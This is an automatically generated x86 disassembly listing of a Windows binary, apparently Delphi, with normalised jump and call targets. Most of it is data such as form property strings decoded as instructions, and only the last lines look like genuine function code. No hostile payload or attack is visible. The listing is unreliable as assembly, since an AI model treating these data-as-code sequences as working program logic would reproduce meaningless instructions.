inc edx
add al al
jpe r-xdata
add al dl
cld
inc ebx
add [ eax - 0x13ffbb87 ] bh
push eax
inc ebp
add al bh
scasd [ edi ]
inc esp
add [ eax ] dh
jpo r-xdata
inc ebx
mov cl 0x43
add [ eax + 0xb0043b0 ] bl
add [ eax ] cl
push ebx
je r-xdata
add [ edx + 0xc0043b4 ] bh
add al [ eax ]
add al al
dec ebx
inc esp
add [ ecx + edx * 2 + 0x51a00045 ] bl
inc ebp
add ah ah
jpe r-xdata
add [ ecx ] dl
push esp
inc edx
add ah ch
jns r-xdata
inc esp
jns r-xdata
insb
jae r-xdata
inc esp
add [ eax ] ch
cmovb eax [ eax ]
mov esp 0x1000420f
adc [ edx ] al
add [ ebx + edi * 2 ] al
je r-xdata
inc ebx
add [ ebp + ebp * 4 - 0x773bffbc ] ch
inc esp
add ah bh
jle r-xdata
add al dl
mov dl 0x44
add [ esi + ecx + 0x34cc0042 ] al
inc eax
add [ eax + edi * 2 + 0x44 ] dl
mov [ eax + eax - 0x64 ] al
push cs
inc edx
add [ ebx + ecx + 0xb7c0042 ] al
inc edx
add [ esi + ecx - 0x293ffbe ] ah
inc ebx
add [ eax ] cl
stc
inc esp
add [ esi + edi * 8 ] ah
inc esp
add [ eax - 0x3 ] dh
inc esp
add [ eax ] bh
jle r-xdata
je r-xdata
jne r-xdata
add [ ecx + edx * 2 ] bh
inc ebp
add [ eax + 0x51 ] dl
inc ebp
add [ edx + edi * 2 ] ah
inc esp
add [ eax + 0x51 ] bh
inc ebp
add [ eax + 0x800447a ] al
std
inc ebx
add [ eax - 0x77ffbb86 ] ah
push ecx
inc ebp
add [ eax ] al
mov al 0x44
add [ ebx + edi * 2 + 0x7bd40044 ] dl
inc esp
add [ ebx + 0x43b2f4c0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x4d ] dh
add [ eax ] bl
enter 0x44 0xd0
mov [ eax + eax + 0x78 ] 0xc6
inc esp
add al dh
inc esp
add al al
rol [ eax + eax - 0x1c ] 0x1
add al 0x45
add [ edi + ebp * 8 + 0x44 ] ch
add [ edx + esi * 8 + 0x44 ] bl
add [ eax ] dl
inc [ ebx ]
xor al 0xfe
inc ebx
add [ eax + eax ] al
cmp [ ebp - 0x10ffec ] bh
fcos
mov al 0xfe
inc ebx
add ah bh
inc [ ebx ]
sar ch 0x43
add [ eax ] cl
inc [ ebx ]
push cs
push esp
inc edx
jne r-xdata
add [ eax - 0x76 ] dl
inc esp
add al cl
mov [ eax + eax - 0x24 ] eax
mov [ eax + eax - 0x78 ] es
mov eax [ eax + eax + 0x38 ]
inc [ ebx ]
xor [ esi - 0xeefffbc ] ch
inc esp
add ah cl
int1
inc esp
add al cl
in al dx
inc esp
add [ eax + 0x480044f1 ] dh
mov bl 0x44
add ah bl
mov ecx 0xc77c0044
inc esp
add [ eax ] ch
inc [ ebx ]
les eax [ fs : eax + eax - 0x6c ]
retn 0x44
add [ ebx + esi * 8 - 0xc5bffbc ] al
inc esp
add [ eax + esi * 8 + 0x7d800044 ] bh
inc esp
add [ ebp + edi * 2 - 0x527fffbc ] al
inc esp
add ah bl
inc esp
add al bl
pop es
inc edx
add ah dl
xor al 0x40
add [ esi + ecx * 8 + 0x44 ] dl
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
sub al 0xb1
inc esp
add ah dh
std
inc esp
add [ esi + eax * 8 ] bl
inc esp
add [ ecx + ecx * 4 ] cl
inc ecx
add [ eax - 0x3bffbb55 ] dh
jg r-xdata
outsb
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0xb3d0c08b
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dl
mov ah 0x43
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x45ffbc4c ] ah
mov ah 0x43
add [ edx + eax ] cl
add [ eax ] al
ror [ ebx + 0x44 ] 0x0
test [ esi ] cl
inc edx
add ah cl
xor al 0x40
add [ esi + ecx * 8 + 0x44 ] dl
add [ eax ] ch
je r-xdata
add [ ebp + ebp * 4 - 0x773bffbc ] ch
inc esp
add ah bh
jle r-xdata
add al dl
mov dl 0x44
add ah bl
mov [ eax + eax - 0x64 ] al
push cs
inc edx
aam 0x34
inc eax
outsb
inc ebx
outsd
outsb
je r-xdata
add [ eax ] bl
enter 0x44 0xd0
mov [ eax + eax + 0x78 ] 0xc6
inc esp
add al dh
inc esp
add al al
rol [ eax + eax - 0x1c ] 0x1
add al 0x45
add [ edi + ebp * 8 + 0x44 ] ch
add [ edx + esi * 8 + 0x44 ] bl
add [ eax ] dl
inc [ ebx ]
xor al 0xfe
inc ebx
add ah ch
inc [ ebx ]
or [ eax ] al
add eax 0x7b006b0
mov al 0x11
mov ebp 0x14bd35
jmp r-xdata
add [ eax - 0x76 ] dl
inc esp
add al cl
mov [ eax + eax - 0x24 ] eax
mov [ eax + eax - 0x78 ] es
mov eax [ eax + eax + 0x38 ]
inc [ ebx ]
xor [ esi - 0xeefffbc ] ch
inc esp
add ah cl
int1
inc esp
add al cl
in al dx
inc esp
add [ eax + 0x480044f1 ] dh
mov bl 0x44
add ah bl
mov ecx 0xc77c0044
inc esp
add [ eax + eax + 0x44 ] dh
add [ esp + eax * 8 + 0x44 ] ah
add [ eax + 0x14004400 ] dh
enter 0x44 0x18
add [ ebx + esi * 8 - 0xc5bffbc ] al
inc esp
add [ eax + esi * 8 + 0x7d800044 ] bh
inc esp
add [ ebp + edi * 2 - 0x527fffbc ] al
inc esp
xor al [ eax ]
inc esp
xor al [ eax ]
sub al 0xb1
inc esp
add ah dh
std
inc esp
outsd
insb
lea eax [ eax ]
shl [ ebx + eax * 2 + 0x540e0700 ] 0x1
inc edx
jne r-xdata
dec eax
inc esp
add [ ecx + ecx * 4 ] cl
inc ecx
add [ eax - 0x3bffbb55 ] dh
je r-xdata
add [ esi + eax * 8 ] bl
outsb
inc ebx
outsd
outsb
je r-xdata
jg r-xdata
mov al 0xab
outsd
insb
shl [ ebx + 0x4f740043 ] 0x1
inc esp
add [ ebx ] cl
add [ eax ] cl
push ebx
je r-xdata
inc esp
add ah al
inc ebx
je r-xdata
add [ ebx + ecx + 0xb7c0042 ] al
inc edx
add [ esi + ecx - 0x9fffbe ] ah
inc ebx
add [ eax ] cl
stc
inc esp
add [ esi + edi * 8 ] ah
inc esp
add [ eax - 0x3 ] dh
inc esp
add [ eax ] bh
jle r-xdata
insb
jae r-xdata
add [ ebp - 0x4abbffc0 ] cl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x4a ] bl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bl
mov dh 0x43
add [ edx - 0x4a ] cl
inc ebx
add [ eax ] bl
add al [ eax ]
add [ ebx + esi * 4 + 0xe840043 ] al
inc edx
add ah cl
xor al 0x40
add al bl
pop es
inc edx
add ah dl
xor al 0x40
sub_43b698
cmp eax [ eax + eax + 0x61 ]
add [ eax ] al
dec [ eax + 0x7e ]
inc esp
add ah ah
jle r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
push cs
add [ esi ] al
inc ebx
popad
outsb
arpl [ ebp + 0x6c ] sp
nop
cmp eax [ eax + eax - 0xc ]
mov al [ eax + eax + 0x24 ]
mov eax [ eax + eax - 0x10 ]
stosb [ edi ]
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
or al 0x0
pop es
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
fwait
imul ebp [ edi + 0x6e ] r-xdata
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0010 ] al
outsd
int3
outsb
jae r-xdata
add bh bh
enter 0x44af 0x0
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
adc [ eax ] al
or eax [ ebx + 0x6f ]
pop ebp
add [ eax ] al
jmp [ eax ]
jb r-xdata
add [ eax ] al
adc eax [ eax ]
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
imul ebp [ esi + 0x74 ] 0x40100073
add [ eax ] dl
add al [ eax ]
inc [ eax ]
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] eax
pop es
inc esp
popa
jne r-xdata
add [ eax ] dl
je r-xdata
add [ eax ] 0x0
add [ eax + 0x4307000f ] al
popad
jo r-xdata
xor al 0x44
add [ edx ] bh
add bh bh
jpe r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
adc al [ eax ]
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
jae r-xdata
add bh bh
call 0xfffffffff843fc8c
mov eax [ eax + eax ]
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040016 ] al
outsd
outsb
je r-xdata
jb r-xdata
add [ eax ] al
xor al 0x44
add [ edx + eax ] dl
add bh bh
adc al 0x2
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop ss
add [ ebx ] cl
dec ebp
outsd
popad
insb
push edx
jae r-xdata
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
add [ gs : eax ] dl
add [ eax ] al
[ ebx + 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
cmp eax [ eax + eax - 0x65 ]
dec eax
imul ebp [ esi + 0x74 ] r-xdata
jl r-xdata
insb
je r-xdata
add bh bh
lodsb [ esi ]
mov al [ eax + eax + 0x1 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5009001b ] al
outsd
jo r-xdata
adc [ eax ] al
pushad
add [ eax ] al
[ eax + eax ]
adc al 0x8a
jo r-xdata
add [ eax ] al
and [ ebx ] 0x0
or cl [ edi + 0x6e ]
inc esp
jb r-xdata
push edi
jb r-xdata
movsb [ edi ] [ esi ]
add [ eax ] eax
call [ eax ]
cmc
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push ds
add [ edi ] al
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
outsb
jne r-xdata
add [ eax ] 0x0
add [ eax + 0x4f090026 ] al
inc esp
jb r-xdata
jo r-xdata
inc esp
add [ eax - 0x55 ] dh
inc esp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
pop ds
add [ edi ] al
push esi
imul esi [ ebx + 0x69 ] r--data
adc [ eax ] al
or [ edx ] eax
add bh bh
dec esp
inc [ ebx ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
adc [ eax ] al
push edi
add [ eax ] al
call [ edx + ecx * 4 ]
adc [ eax ] al
cdq
add [ eax ] al
inc [ esp + ecx * 4 + 0x44 ]
add [ esp + ecx * 4 ] cl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5308001c ] al
push 0x6948776f
outsb
je r-xdata
dec ebx
jns r-xdata
adc al 0x56
inc ecx
add al al
add [ eax ] eax
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
push esi
jo r-xdata
add [ eax ] al
and [ ecx ] 0x0
pop es
dec edi
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
xor [ ecx ] al
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and al [ eax ]
push cs
dec edi
push esi
inc ecx
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
add [ eax ] al
and [ eax ] al
or [ edi + 0x6f ] dl
jb r-xdata
cmp eax [ eax + eax + 0x78 ]
hlt
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
jns r-xdata
jb r-xdata
outsb
inc ebx
outsd
outsb
je r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0022 ] al
inc esp
add al dh
add [ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0024 ] al
outsb
add [ eax ] al
js r-xdata
loopne r-xdata
jo r-xdata
cmp eax 0xd80044
cmp [ esi ] 0x44
add al ah
add [ eax ] eax
jmp eax
add bh bh
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub eax 0x6e4f0b00
fadd [ eax ]
jb r-xdata
add [ eax ] al
sub [ eax ] 0x0
push es
dec edi
outsb
inc ebp
js r-xdata
push esi
inc ecx
add al cl
add [ eax ] eax
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060028 ] al
add [ eax + 0x4f070027 ] al
add [ eax ] al
dec edi
jbe r-xdata
aas
inc esp
add [ eax ] bl
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
push eax
outsd
jo r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ cs : ecx ] cl
dec edi
outsb
dec ebp
outsd
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f09002e ] al
cmp eax 0xd00044
add bh bh
rol [ eax ] 0x1
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub al 0x0
or ecx [ edi + 0x6e ]
popad
dec ebp
outsd
jbe r-xdata
dec ebp
outsd
jne r-xdata
dec edi
outsb
jae r-xdata
jns r-xdata
je r-xdata
outsb
inc ebp
outsb
je r-xdata
jb r-xdata
outsb
inc ebp
outsb
inc esp
jb r-xdata
add bh bh
sbb [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ es : ecx ] cl
dec edi
jo r-xdata
push ebp
outsb
arpl [ eax + 0x65 ] bp
arpl [ ebx + 0x65 ] bp
or [ fs : ebx + 0x62 ] esp
inc ebx
push 0x656b6365
or [ fs : ebx + 0x62 ] ah
push ebp
jo r-xdata
arpl [ ebx - 0x5c ] bp
aas
inc esp
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0030 ] al
inc esp
outsd
ja r-xdata
outsb
push ebx
je r-xdata
dec edi
pop eax
cmp eax 0xe00044
add bh bh
add [ eax ] al
jmp eax
xor al 0x3e
inc esp
add al ch
add [ eax ] eax
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a002a ] al
outsb
dec ebx
jns r-xdata
inc esp
add al bl
add [ eax ] eax
inc esp
jb r-xdata
add [ eax - 0x80000000 ] al
and al 0x0
or cl [ edi + 0x6e ]
add [ eax + 0x4f090025 ] al
outsb
inc ebp
outsb
inc esp
outsd
arpl [ ebx - 0x14 ] bp
aas
inc esp
add [ eax ] cl
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
aas
inc esp
add al ch
add [ eax ] al
inc esp
add [ ecx + ecx * 4 ] cl
inc ecx
add [ eax - 0x3bffbb55 ] dh
jns r-xdata
dec ebp
outsd
jne r-xdata
inc ecx
inc esp
add [ eax ] al
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b002f ] al
outsb
push ebx
je r-xdata
add [ eax - 0x43 ] dh
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi * 4 - 0x42a5ffbd ] dh
jb r-xdata
sar [ 0xd80044 ] 0x1
add [ ebp + ebp * 4 - 0x773bffbc ] ch
inc esp
add ah bh
jle r-xdata
add al dl
mov dl 0x44
add ah bl
mov [ eax + eax - 0x64 ] al
push cs
inc edx
add [ ebx + ecx + 0xb7c0042 ] al
jg r-xdata
mov al 0xab
inc esp
add ah al
or [ fs : ebx + 0x74 ] dl
inc ebx
je r-xdata
inc edi
jb r-xdata
or [ fs : ebx + 0x62 ] ah
jb r-xdata
add [ eax ] al
test [ ebx + 0xe840043 ] dh
inc edx
add ah cl
xor al 0x40
add al bl
pop es
inc edx
add ah dl
xor al 0x40
add [ esi + ecx * 8 + 0x44 ] dl
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
sub al 0xb1
inc esp
add ah dh
std
inc esp
add [ esi + eax * 8 ] bl
adc al 0x2
inc esp
jb r-xdata
add [ eax ] bl
enter 0x44 0xd0
mov [ eax + eax + 0x78 ] 0xc6
inc esp
add al dh
inc esp
add al al
rol [ eax + eax - 0x1c ] 0x1
add al 0x45
add [ edi + ebp * 8 + 0x44 ] ch
add [ edx + esi * 8 + 0x44 ] bl
add [ eax - 0x57ffbbfd ] cl
add eax [ eax + eax + 0x34 ]
add eax [ eax + eax + 0x6 ]
add [ 0x6b01000 ] al
mov al 0x11
mov ebp 0xffcaffeb
cwde
add al 0x44
add [ esp + eax + 0x4b40044 ] ch
inc esp
add [ eax + 0x5 ] dl
inc esp
add [ ebx + eax + 0x44 ] dh
add [ eax ] cl
add eax [ eax + eax + 0xf ]
push esp
inc ebx
jne r-xdata
add [ eax - 0x76 ] dl
inc esp
add al cl
mov [ eax + eax - 0x24 ] eax
mov [ eax + eax - 0x78 ] es
mov eax [ eax + eax + 0x38 ]
inc [ ebx ]
xor [ esi - 0xeefffbc ] ch
inc esp
add ah cl
int1
inc esp
add al cl
in al dx
inc esp
add [ eax + 0x480044f1 ] dh
mov bl 0x44
add ah bl
mov ecx 0xc77c0044
add [ ebx + esi * 8 - 0xc5bffbc ] al
inc esp
add [ eax + esi * 8 + 0x7d800044 ] bh
inc esp
add [ ebp + edi * 2 - 0x527fffbc ] al
inc esp
or eax [ edx ]
jl r-xdata
insb
jae r-xdata
inc eax
add [ eax - 0x44 ] ah
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
inc ebx
add [ edx + eax ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor al 0xbd
inc ebx
add [ edx - 0x43 ] bl
int3
add [ eax ] al
add [ eax ] al
add [ eax ] al
fdivr [ esi + 0x2180043 ]
je r-xdata
stc
inc esp
add [ esi + edi * 8 ] ah
inc esp
add [ eax - 0x3 ] dh
inc esp
add [ eax ] bh
jle r-xdata
inc edx
add [ esi + ecx + 0x29c0042 ] ah
inc esp
add [ eax ] cl
outsd
add [ ebp + ebp * 4 - 0x773bffbc ] ch
inc esp
add ah bh
jle r-xdata
add al dl
mov dl 0x44
add ah bl
mov [ eax + eax - 0x64 ] al
push cs
inc edx
add [ ebx + ecx + 0xb7c0042 ] al
inc edx
add [ esi + ecx + 0x29c0042 ] ah
inc esp
add [ eax ] cl
stc
inc esp
add [ esi + edi * 8 ] ah
inc esp
add [ eax - 0x3 ] dh
inc esp
add [ eax ] bh
jle r-xdata
add [ eax ] al
insd
inc ebx
push 0x426b6365
outsd
js r-xdata
add [ eax ] bl
enter 0x44 0xd0
mov [ eax + eax + 0x78 ] 0xc6
inc esp
add al dh
inc esp
add al al
rol [ eax + eax - 0x1c ] 0x1
add al 0x45
add [ edi + ebp * 8 + 0x44 ] ch
add [ edx + esi * 8 + 0x44 ] bl
add [ eax - 0x57ffbbfd ] cl
add eax [ eax + eax + 0x34 ]
add eax [ eax + eax + 0x9 ]
push esp
inc ebx
push 0x426b6365
outsd
js r-xdata
add [ eax - 0x76 ] dl
inc esp
add al cl
mov [ eax + eax - 0x24 ] eax
add al cl
in al dx
inc esp
add [ eax + 0x480044f1 ] dh
mov bl 0x44
add ah bl
mov ecx 0xc77c0044
inc esp
add [ eax ] dl
add al 0x44
add [ esp + eax * 8 + 0x44 ] ah
add [ esp + eax + 0x44 ] ch
add [ eax + ecx * 8 ] dl
inc esp
add [ ebx + esi * 8 - 0xc5bffbc ] al
inc esp
add [ eax + esi * 8 + 0x7d800044 ] bh
inc esp
add [ ebp + edi * 2 - 0x527fffbc ] al
inc esp
inc esp
add [ eax ] dl
add al 0x44
add [ esp + eax * 8 + 0x44 ] ah
add [ esp + eax + 0x44 ] ch
add [ eax + ecx * 8 ] dl
inc esp
shl [ eax - 0x43 ] 0x43
add [ edi ] al
andps xmm0 [ ebx + 0x75 ]
jae r-xdata
mov [ eax + eax - 0x78 ] es
mov eax [ eax + eax + 0x38 ]
inc [ ebx ]
xor [ esi - 0xeefffbc ] ch
inc esp
add ah cl
int1
inc esp
inc esp
add ah bl
shr al 0xbe
inc ebx
add [ edi ] al
or [ ebx + eax * 2 + 0x68 ] edx
arpl [ gs : ebx + 0x42 ] bp
outsd
js r-xdata
add al bl
pop es
inc edx
add ah dl
xor al 0x40
add [ esi + ecx * 8 + 0x44 ] dl
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
sub al 0xb1
inc esp
add ah dh
std
inc esp
add [ esi + eax * 8 ] bl
inc esp
add [ ecx + ecx * 4 ] cl
inc ecx
add [ eax - 0x3bffbb55 ] dh
jg r-xdata
outsd
insd
inc ebx
push 0x426b6365
outsd
js r-xdata
mov ebp 0x360043
or [ ebx + 0x74 ] dl
inc ebx
mov esi 0xbd6c0043
inc ebx
add [ esi ] dh
add [ eax ] cl
push ebx
je r-xdata
inc ebx
add [ esi + ecx + 0x34cc0042 ] al
inc eax
mov esp 0xb4cc0043
inc ebx
add [ eax + eax ] cl
or [ ebx + 0x74 ] dl
inc ebx
je r-xdata
add [ ecx ] ah
add bh bh
dec eax
jle r-xdata
insb
jae r-xdata
push cs
add [ ebx ] cl
inc ecx
insb
insb
outsd
ja r-xdata
je r-xdata
inc ebx
hlt
insb
jae r-xdata
inc esp
add al dh
add ah ah
jle r-xdata
add eax [ eax + eax + 0x1 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or eax 0x6c410900
imul esp [ edi + 0x6e ] 0x746e656d
add [ eax ] dl
inc eax
add [ ecx ] dl
add al [ eax ]
call [ ecx ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax + 0x6c ] ah
inc ecx
add [ eax + eax ] bh
add dh bh
push 0x100447e
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4106000c ] al
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
movsb [ edi ] [ esi ]
push esp
inc ecx
add [ eax ] dl
add al [ eax ]
call [ ebx + eax + 0x10044 ]
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
stosb [ edi ]
outsd
nop
jb r-xdata
add [ eax ] dl
inc eax
add [ ecx + eax - 0xaef0100 ] ah
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or eax [ eax ]
pop es
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
add [ eax ] al
adc [ eax ] al
movsb [ edi ] [ esi ]
add [ eax ] eax
call [ eax ]
cmc
hlt
imul ebp [ edi + 0x6e ] r-xdata
enter 0x0 0xfe
int3
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070011 ] al
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
sldt [ edi ]
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
popad
jo r-xdata
add [ edi ] al
inc ebx
jns r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ch
mov esi 0x43
add [ eax ] al
add [ eax ] al
adc al 0xbc
mov esi 0x43
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
call sub_44018b
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bl
mov esi 0x2180043
mov al 0x8c
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050013 ] al
outsd
insb
outsd
jb r-xdata
int3
hlt
cmp eax [ eax + eax - 0xc ]
mov al [ eax + eax + 0x24 ]
mov eax [ eax + eax - 0x10 ]
cmp al 0x44
add [ eax + eax ] dh
dec eax
scasd [ edi ]
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0014 ] al
outsd
outsb
jae r-xdata
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb [ eax ] al
or [ edx + esi * 2 + 0x61 ] al
dec ebp
outsd
add [ gs : eax ] dl
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
jb r-xdata
pop ss
add [ eax ] cl
inc esp
jb r-xdata
imul ebp [ esi + 0x74 ] 0x40100073
add [ ebp + 0x1cff0001 ] ah
sbb [ edx ] 0x0
add al 0x46
outsd
outsb
je r-xdata
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
adc [ eax ] al
pushad
add [ eax ] al
[ eax + eax ]
sub_43c510
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push esp
mov [ ebx ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ch
mov [ ebx ] 0x42
mov [ ebx ] 0x14
add al [ eax ]
add [ ebx + esi * 4 + 0xe840043 ] al
inc edx
add ah cl
xor al 0x40
add al bl
pop es
inc edx
add ah dl
xor al 0x40
add [ esi + ecx * 8 + 0x44 ] dl
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
sub al 0xb1
inc esp
add ah dh
std
inc esp
add [ esi + eax * 8 ] bl
inc esp
add [ ecx + ecx * 4 ] cl
inc ecx
add [ eax - 0x3bffbb55 ] dh
jg r-xdata
add [ ebp + ebp * 4 - 0x773bffbc ] ch
inc esp
add ah bh
jle r-xdata
add al dl
mov dl 0x44
add ah bl
mov [ eax + eax - 0x64 ] al
push cs
inc edx
add [ ebx + ecx + 0xb7c0042 ] al
inc edx
add [ esi + ecx + 0x5600042 ] ah
inc esp
add [ eax ] cl
stc
inc esp
add [ esi + edi * 8 ] ah
inc esp
add [ eax - 0x3 ] dh
inc esp
add [ eax ] bh
jle r-xdata
add [ eax ] bl
enter 0x44 0xd0
mov [ eax + eax + 0x78 ] 0xc6
inc esp
add al dh
inc esp
add al al
rol [ eax + eax - 0x1c ] 0x1
add al 0x45
add [ edi + ebp * 8 + 0x44 ] ch
add [ edx + esi * 8 + 0x44 ] bl
add al al
add eax 0x6c40044
inc esp
add [ eax + eax ] al
adc [ eax - 0x42ee4ffa ] dh
0xd4ff
add [ eax - 0x76 ] dl
inc esp
add al cl
mov [ eax + eax - 0x24 ] eax
mov [ eax + eax - 0x78 ] es
mov eax [ eax + eax + 0x38 ]
inc [ ebx ]
xor [ esi - 0xeefffbc ] ch
inc esp
add ah cl
int1
inc esp
add al cl
in al dx
inc esp
add [ eax + 0x480044f1 ] dh
mov bl 0x44
add ah bl
mov ecx 0xc77c0044
inc esp
add [ eax + 0x7 ] dl
inc esp
add [ esp + eax * 8 + 0x44 ] ah
add [ eax + 0x14004407 ] ch
enter 0x44 0x18
add [ ebx + esi * 8 - 0xc5bffbc ] al
inc esp
add [ eax + esi * 8 + 0x7d800044 ] bh
inc esp
add [ ebp + edi * 2 - 0x527fffbc ] al
inc esp
sub_43c633
pop es
inc esp
add ah bl
pop es
inc esp
add [ eax + 0x8 ] ah
inc esp
add al cl
add eax 0x540c0044
push edx
popad
imul ebp [ fs : edi + 0x42 ] 0x6f747475
outsb
nop
push esp
mov [ ebx ] 0x7
or al 0x54
push edx
popad
imul ebp [ fs : edi + 0x42 ] 0x6f747475
outsb
pop eax
lds eax [ ebx ]
int3
sub_43d234
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_450f60
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov edx 0xb9
mov eax esi
call sub_4482b0
mov edx 0x69
mov eax esi
call sub_4482d4
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035dc
mov eax esi
pop esi
pop ebx
retn
call sub_403634
pop [ fs : 0x0 ]
add esp 0xc
sub_43d290
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44b348
mov edx [ ebx + 0x68 ]
mov eax [ ebx + 0x208 ]
call sub_4247d4
mov edx r-xdata
mov eax [ ebx + 0x208 ]
